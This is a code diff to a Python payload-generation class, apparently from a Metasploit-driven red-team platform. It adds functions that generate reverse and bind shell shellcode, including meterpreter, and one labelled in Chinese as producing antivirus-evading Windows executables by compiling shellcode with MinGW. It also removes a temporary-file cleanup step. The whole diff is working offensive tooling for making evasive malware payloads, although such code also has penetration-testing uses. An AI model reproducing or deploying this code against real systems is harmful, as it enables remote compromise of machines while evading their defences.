@@ -68,6 +68,7 @@ class Payload(object):
             Notice.send_warn("Payload包含OverrideRequestHost参数")
             Notice.send_warn(f"将LHOST 替换为 OverrideLHOST:{opts['OverrideLHOST']}")
             Notice.send_warn(f"将LPORT 替换为 OverrideLPORT:{opts['OverrideLPORT']}")
+
         # EXTENSIONS参数
         if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
             opts['EXTENSIONS'] = 'stdapi'
@@ -178,6 +179,86 @@ class Payload(object):
         return response
 
     @staticmethod
+    def generate_shellcode(mname=None, opts=None):
+        """根据配置生成shellcode"""
+        # 处理RHOST及LHOST参数
+        if mname.find("reverse") > 0:
+            try:
+                opts.pop('RHOST')
+            except Exception as _:
+                pass
+        elif mname.find("bind") > 0:
+            try:
+                opts.pop('LHOST')
+            except Exception as _:
+                pass
+
+        # 处理OverrideRequestHost参数
+        if opts.get('OverrideRequestHost') is True:
+            opts["LHOST"] = opts['OverrideLHOST']
+            opts["LPORT"] = opts['OverrideLPORT']
+            Notice.send_warn("Payload包含OverrideRequestHost参数")
+            Notice.send_warn(f"将LHOST 替换为 OverrideLHOST:{opts['OverrideLHOST']}")
+            Notice.send_warn(f"将LPORT 替换为 OverrideLPORT:{opts['OverrideLPORT']}")
+
+        # EXTENSIONS参数
+        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
+            opts['EXTENSIONS'] = 'stdapi'
+
+        opts["Format"] = 'raw'
+        if "windows" in mname:
+            opts["Format"] = 'raw'
+        elif "linux" in mname:
+            opts["Format"] = 'raw'
+        elif "java" in mname:
+            opts["Format"] = 'jar'
+        elif "python" in mname:
+            opts["Format"] = 'py'
+        elif "php" in mname:
+            opts["Format"] = 'raw'
+
+        result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
+        if result is None:
+            return result
+        byteresult = base64.b64decode(result.get('payload'))
+        return byteresult
+
+    @staticmethod
+    def generate_bypass_exe(mname=None, opts=None):
+        "生成免杀的exe"
+        # 处理RHOST及LHOST参数
+        if mname.find("reverse") > 0:
+            try:
+                opts.pop('RHOST')
+            except Exception as _:
+                pass
+        elif mname.find("bind") > 0:
+            try:
+                opts.pop('LHOST')
+            except Exception as _:
+                pass
+
+        # 处理OverrideRequestHost参数
+        if opts.get('OverrideRequestHost') is True:
+            opts["LHOST"] = opts['OverrideLHOST']
+            opts["LPORT"] = opts['OverrideLPORT']
+            Notice.send_warn("Payload包含OverrideRequestHost参数")
+            Notice.send_warn(f"将LHOST 替换为 OverrideLHOST:{opts['OverrideLHOST']}")
+            Notice.send_warn(f"将LPORT 替换为 OverrideLPORT:{opts['OverrideLPORT']}")
+
+        # EXTENSIONS参数
+        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
+            opts['EXTENSIONS'] = 'stdapi'
+
+        opts["Format"] = "hex"
+        result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
+        if result is None:
+            return None
+        shellcode = base64.b64decode(result.get('payload'))
+        byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=shellcode)
+        return byteresult
+
+    @staticmethod
     def _create_payload_by_mingw(mname=None, shellcode=None, payload_type="REVERSE_HEX"):
         if payload_type == "REVERSE_HEX":
             env = Environment(loader=FileSystemLoader(Mingw.CODE_TEMPLATE_DIR))
@@ -200,7 +281,6 @@ class Payload(object):
             raise Exception('unspport mname')
         mingwx64 = Mingw()
         byteresult = mingwx64.compile_c(src, arch)
-        mingwx64.cleanup_files()
         return byteresult
 
     @staticmethod
